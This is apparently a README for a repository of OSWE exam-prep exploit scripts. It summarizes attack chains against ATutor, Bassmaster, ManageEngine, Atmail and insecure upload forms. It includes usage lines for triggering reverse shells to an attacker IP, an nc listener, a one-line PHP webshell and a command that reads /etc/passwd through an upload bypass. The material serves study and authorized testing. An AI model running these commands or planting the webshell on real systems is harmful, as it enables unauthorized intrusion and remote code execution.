# OSWE PoC Examples - Skeleton-Based Implementations

This directory contains complete, working PoC examples for OSWE exam preparation. Each example follows the reusable skeleton framework from "Building a Reusable OSWE PoC Skeleton" guide.

## Quick Navigation

| Vulnerability | CVE | Type | Difficulty |
|---|---|---|---|
| [ATutor Type Juggling](#atutor-type-juggling) | SRC-2016-0012 | PHP Type Juggling → Auth Bypass → RCE | ⭐⭐ |
| [Bassmaster JS Injection](#bassmaster-nodejs-injection) | CVE-2014-7205 | NodeJS JavaScript Injection → RCE | ⭐⭐ |
| [ManageEngine SQLi](#manageengine-sqli) | Various | PostgreSQL SQLi → File Write → RCE | ⭐⭐⭐ |
| [Atmail XSS to RCE](#atmail-xss-to-rce) | CVE-2012-2593 | Stored XSS → CSRF → RCE | ⭐⭐⭐ |
| [File Upload to RCE](#file-upload-to-rce) | N/A (common pattern) | Insecure Upload → Webshell → RCE | ⭐⭐⭐ |

## Directory Structure

```
poc-examples/
├── README.md (this file)
├── atutor-type-juggling/
│   ├── poc.py
│   ├── Notes.md
│   ├── Archives/
│   ├── Logs/
│   └── Screenshots/
├── bassmaster-js-injection/
│   ├── poc.py
│   ├── Notes.md
│   └── ...
├── manageengine-sqli/
│   ├── poc.py
│   ├── Notes.md
│   └── ...
└── atmail-xss-rce/
    ├── poc.py
    ├── Notes.md
    └── ...
```

## Prerequisites

### System Requirements
```bash
# Python 3.8+
python3 --version

# Install uv package manager (recommended)
curl -LsSf https://astral.sh/uv/install.sh | sh

# OR use pip
pip3 install requests urllib3
```

### Lab Environment
- VirtualBox or VMware for vulnerable VMs
- Kali Linux or Parrot OS for attacking machine
- Burp Suite for HTTP debugging
- Network connectivity between attacker and target

## Example Summaries

### ATutor Type Juggling

**Vulnerability**: PHP loose comparison (`==`) in password reset token validation

**Exploitation Path**:
```
User Registration → Type Juggling (Magic Hash) → Admin Password Reset
→ Admin Login → File Upload → RCE
```

**Key Concepts**:
- PHP magic hashes (0e followed by digits)
- Loose vs strict comparison
- Authentication bypass techniques

**Usage**:
```bash
cd atutor-type-juggling

# Basic exploitation
python3 poc.py --target-ip 192.168.1.100

# With Burp proxy
python3 poc.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080
```

**Learning Value**: ⭐⭐⭐⭐⭐
- Critical for OSWE: Type juggling is a common PHP vulnerability
- Demonstrates vulnerability chaining
- Shows importance of code review (== vs ===)

---

### Bassmaster NodeJS Injection

**Vulnerability**: Unsafe `eval()` in batch request handler

**Exploitation Path**:
```
Batch Endpoint Discovery → JavaScript Injection → NodeJS Code Execution
→ Reverse Shell
```

**Key Concepts**:
- NodeJS `require('child_process')` for RCE
- Blind RCE verification techniques
- API vulnerability exploitation

**Usage**:
```bash
cd bassmaster-js-injection

# Command execution
python3 poc.py --target-ip 192.168.1.100 --target-port 8080 --command "whoami"

# Reverse shell
# Terminal 1: Start listener
nc -nlvp 9001

# Terminal 2: Trigger shell
python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --reverse-shell
```

**Learning Value**: ⭐⭐⭐⭐
- NodeJS exploitation techniques
- Blind RCE verification methods
- Modern API security

---

### ManageEngine SQLi

**Vulnerability**: SQL Injection in AMUserResourcesSyncServlet

**Exploitation Path**:
```
SQLi Discovery → Time-based Extraction → PostgreSQL Function Abuse
→ File Write → JSP Shell → RCE
```

**Key Concepts**:
- PostgreSQL-specific functions (pg_sleep, pg_read_file, COPY)
- Blind SQLi with binary search
- JSP webshell development
- Stacked queries

**Usage**:
```bash
cd manageengine-sqli

# Full exploitation
python3 poc.py --target-ip 192.168.1.100 --target-port 9090

# Custom delay for slow networks
python3 poc.py --target-ip 192.168.1.100 --delay 5

# With charset selection for extraction
python3 poc.py --target-ip 192.168.1.100 --charset hex
```

**Learning Value**: ⭐⭐⭐⭐⭐
- Essential for OSWE: SQLi to RCE is a core exam topic
- PostgreSQL-specific exploitation
- Demonstrates data extraction optimization

---

### Atmail XSS to RCE

**Vulnerability**: Stored XSS in webmail admin panel

**Exploitation Path**:
```
User Registration → Stored XSS Injection → Admin Views Email
→ CSRF Trigger → File Upload → RCE
```

**Key Concepts**:
- Stored XSS exploitation
- CSRF attacks in admin context
- JavaScript payload delivery
- Multi-stage exploitation

**Usage**:
```bash
cd atmail-xss-rce

# Setup payload server first
mkdir /tmp/atmail-payloads
cd /tmp/atmail-payloads
cat > plugin.php << 'EOF'
<?php system($_REQUEST['cmd']); ?>
EOF
python3 -m http.server 8000

# In another terminal, run exploit
python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --payload-port 8000
```

**Learning Value**: ⭐⭐⭐⭐
- XSS to RCE escalation
- Understanding admin workflows
- CSRF exploitation
- Social engineering aspects

---

### File Upload to RCE

**Vulnerability**: Insecure file upload (weak extension / Content-Type / magic-byte / path handling) leading to webshell deployment and RCE.

**Exploitation Path**:
```
Recon upload form + filters → Craft bypass (double-ext, magic bytes, content-type lie, etc.)
→ Upload webshell (PHP/ASPX/JSP) → Locate file on disk (response or common dirs)
→ Execute via direct request or LFI → RCE (whoami, reverse shell, further access)
```

**Key Concepts**:
- Extension vs Content-Type vs magic byte validation bypasses
- Double extensions, null bytes (legacy), case tricks, combined bypasses
- Webshell construction for multiple languages
- Predictable upload paths + response path disclosure
- Chaining (upload after auth bypass / SQLi write / XSS CSRF)

**Usage**:
```bash
cd file-upload-rce

# Most common starting bypass for PHP targets
python3 poc.py 192.168.1.10 80 --endpoint /upload.php \
  --bypass double_ext --shell-type php --command whoami \
  10.10.14.5 4444

# Magic bytes (when they inspect content)
python3 poc.py target 8080 --bypass magic_bytes --shell-type php \
  --command "cat /etc/passwd" 10.10.14.5 9001

# ASPX / IIS target
python3 poc.py 10.10.10.50 80 --endpoint /admin/upload.aspx \
  --bypass content_type --shell-type aspx 10.10.14.5 4444

# With Burp for debugging
python3 poc.py ... --proxy http://127.0.0.1:8080
```

**Learning Value**: ⭐⭐⭐⭐⭐
- One of the most reliable and frequently chained RCE vectors in OSWE
- Teaches filter bypass thinking that applies to many other validation flaws
- Excellent for practicing stage-based PoCs and post-upload discovery
- See also: `guides/File-Upload-to-RCE.md` (full methodology + diagrams + cheat sheets), `notes/FILE-UPLOAD-TO-RCE.md`, Roadmap Week 6, HTB Popcorn/Vault

## Common Usage Patterns

### Burp Suite Integration
All PoCs support proxying through Burp:
```bash
python3 poc.py --target-ip TARGET --proxy http://127.0.0.1:8080
```

### Custom Attacker IP
For reverse shells and callbacks:
```bash
python3 poc.py --target-ip TARGET --listening-ip YOUR_IP --listening-port 9001
```

### Help and Documentation
Every PoC has built-in help:
```bash
python3 poc.py --help
```

## Study Approach

### For Each Vulnerability:

1. **Read Notes.md** - Understand the vulnerability before running code
2. **Set up lab** - Install the vulnerable application
3. **Manual testing** - Try to exploit manually first
4. **Run PoC** - Execute the automated script
5. **Modify PoC** - Customize for different scenarios
6. **Document** - Take screenshots and notes

### Recommended Study Order:

1. **Week 1**: ATutor Type Juggling
   - Easiest to set up
   - Clear vulnerability demonstration
   - Good introduction to skeleton framework

2. **Week 2**: Bassmaster NodeJS
   - Modern web framework
   - Blind RCE concepts
   - Quick to exploit

3. **Week 3**: ManageEngine SQLi
   - Most complex
   - Critical for exam
   - Multiple exploitation techniques

4. **Week 4**: Atmail XSS to RCE
   - Multi-stage attack
   - Requires patience
   - Good for chaining practice

## Skeleton Framework Reference

All PoCs follow this structure:

### 1. Imports and Setup
```python
import argparse
import requests
from dataclasses import dataclass
```

### 2. ExploitContext Class
```python
@dataclass(slots=True)
class ExploitContext:
    target_ip: str
    target_port: int
    # ... configuration fields

    @classmethod
    def from_args(cls, args):
        # Build from argparse
```

### 3. Argument Parsing
```python
def parse_args():
    parser = argparse.ArgumentParser()

    # Target options
    target_group = parser.add_argument_group("Target options")
    # ... arguments

    # Attacker options
    attacker_group = parser.add_argument_group("Attacker options")
    # ... arguments
```

### 4. Stage Functions
```python
def stage_recon(ctx: ExploitContext) -> bool:
    # Stage 1: Reconnaissance
    pass

def stage_exploit(ctx: ExploitContext) -> bool:
    # Stage 2: Exploitation
    pass

def stage_verify(ctx: ExploitContext) -> bool:
    # Stage 3: Verification
    pass
```

### 5. Main Execution
```python
def main():
    args = parse_args()
    ctx = ExploitContext.from_args(args)

    stages = [
        ("Reconnaissance", stage_recon),
        ("Exploitation", stage_exploit),
        ("Verification", stage_verify),
    ]

    for name, func in stages:
        if not func(ctx):
            print(f"Stage {name} failed")
```

## Tips for OSWE Exam

### Time Management
- **Reconnaissance**: 10 minutes max per machine
- **Vulnerability Identification**: 30-45 minutes
- **PoC Development**: 60-90 minutes
- **Documentation**: 20-30 minutes per machine

### PoC Development Strategy
1. **Start with skeleton** - Don't write from scratch
2. **Test incrementally** - Verify each stage before moving forward
3. **Use --proxy flag** - Debug with Burp when stuck
4. **Keep it simple** - Exam wants working code, not perfect code
5. **Comment thoroughly** - Examiners review your code

### Code Review Focus
When analyzing source code, look for:
- **Type juggling**: `==` vs `===` in PHP
- **SQL injection**: String concatenation in queries
- **Command injection**: `system()`, `exec()`, `shell_exec()`
- **Deserialization**: `unserialize()`, Java `readObject()`
- **Path traversal**: `include()`, `require()`, file operations
- **XSS**: Unescaped output in HTML context

### Common Exam Patterns
1. **SQLi → RCE**: Very common, practice extensively
2. **Deserialization → RCE**: Learn ysoserial and .NET formatters
3. **Auth Bypass → File Upload → RCE**: Classic chain
4. **XSS → CSRF → RCE**: Less common but valuable
5. **XXE → File Read → Information Disclosure**: Know XML parsers

## Debugging Tips

### If Exploit Fails

1. **Check connectivity**:
```bash
ping target-ip
nc -zv target-ip target-port
```

2. **Verify service is running**:
```bash
curl http://target-ip:port/
nmap -sV -p port target-ip
```

3. **Use Burp Suite**:
```bash
python3 poc.py --target-ip TARGET --proxy http://127.0.0.1:8080
# Then inspect traffic in Burp
```

4. **Enable verbose output** (modify PoC):
```python
# Add print statements in each stage
print(f"[DEBUG] Request: {request.url}")
print(f"[DEBUG] Response: {response.status_code}")
print(f"[DEBUG] Body: {response.text[:500]}")
```

5. **Test manually first**:
- Use curl for HTTP requests
- Use sqlmap for SQLi
- Use browser dev tools for XSS

## Additional Resources

### OSWE-Specific Resources
- **Main Guide**: See `../OSWE-PoC-Skeleton-Guide.md`
- **Prep Content**: See `../OSWE-Prep-content.md`
- **Building Skeleton**: See `../Building a Reusable OSWE PoC Skeleton.md`

### External Resources
- PortSwigger Web Security Academy
- PentesterLab exercises
- HackTheBox OSWE-like machines
- Exploit-DB for real-world examples

## Contributing

Found issues or improvements?
1. Test your changes in a lab environment
2. Update the Notes.md file
3. Document changes in commit message
4. Submit pull request

## Disclaimer

**For Educational Purposes Only**

These PoCs are for:
- OSWE exam preparation
- Authorized penetration testing
- Security research in controlled environments
- Educational demonstrations

**DO NOT** use against systems you don't own or have explicit permission to test.

## License

Educational use only. See main repository license.

---

## Quick Start Checklist

- [ ] Install Python 3.8+
- [ ] Install requests library
- [ ] Set up lab environment
- [ ] Read vulnerability-specific Notes.md
- [ ] Configure Burp Suite
- [ ] Test network connectivity
- [ ] Run PoC with --help flag
- [ ] Execute exploit
- [ ] Document findings
- [ ] Take screenshots for proof

---

**Good luck with your OSWE preparation! 🎯**

For questions or issues, refer to the individual Notes.md files or the main OSWE-Prep repository.
